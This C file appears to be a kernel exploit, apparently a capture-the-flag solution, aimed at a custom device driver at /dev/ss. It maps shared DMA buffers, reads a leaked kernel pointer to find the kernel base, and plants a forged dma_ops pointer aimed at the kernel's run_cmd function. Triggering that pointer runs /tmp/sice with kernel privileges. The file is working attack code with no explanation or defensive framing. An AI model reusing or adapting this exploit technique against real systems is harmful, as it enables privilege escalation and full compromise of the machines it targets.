#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <sys/mman.h>
#include <stdint.h>

int main(int argc, char** argv) {
    int dma_fds[16];
    void* dma_pages[16];
    for (int i = 0; i < 16; i++) {
        int fd2 = open("/dev/ss", O_RDWR);
        ioctl(fd2, 0, i);
        dma_fds[i] = fd2;
        void *page_dma_buf = mmap(0, 0x10000uLL, PROT_READ|PROT_WRITE, MAP_SHARED, fd2, 0);
        dma_pages[i] = page_dma_buf;
        printf("%d\n", i);
    }

    memset(dma_pages[15], 0xff, 0x10000uLL);

    int fd = open("/dev/ss", O_RDWR);

    ioctl(fd, 0, 0);
    void* page = mmap(0, 0x100000000uLL, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
    printf("%p\n", page);
    uint64_t leak_addr = page + 0xffffe000uLL + 15*8;
    uint64_t val = *((uint64_t*)(leak_addr));
    printf("%p\n", val);

    uint64_t kernel_base = val - 0x1753aa0uL;
    printf("Kernel Base - %p\n", kernel_base);

    uint64_t dma_buf_addr = *((uint64_t*)(page + 0xfffff000uLL + 0x30)) - 0x30 + 0x1000;
    printf("DMA Buf Addr - %p\n", dma_buf_addr);

    *((uint64_t*)dma_pages[1]) = kernel_base + 0xc5770;     // run_cmd

    strcpy(dma_pages[0], "/tmp/sice");
    // *(uint64_t*)(dma_pages[0] + 0) = 0x4141414142424242uLL;
    *(uint64_t*)(dma_pages[0] + 544) = dma_buf_addr + 0x10000;      // dma_ops
    *(uint64_t*)(dma_pages[0] + 560) = 1;            // coherent_dma_mask

    *((uint64_t*)(page + 0xfffff000uLL + 0x10)) = dma_buf_addr - 176;    // offset of dev in pci_dev

    puts("ready to sploit");

    if (argc > 1) {
        getchar();
    }

    puts("Starting exploit");

    *((uint64_t*)(dma_pages[2])) = 1;

    puts("sploit over");
}

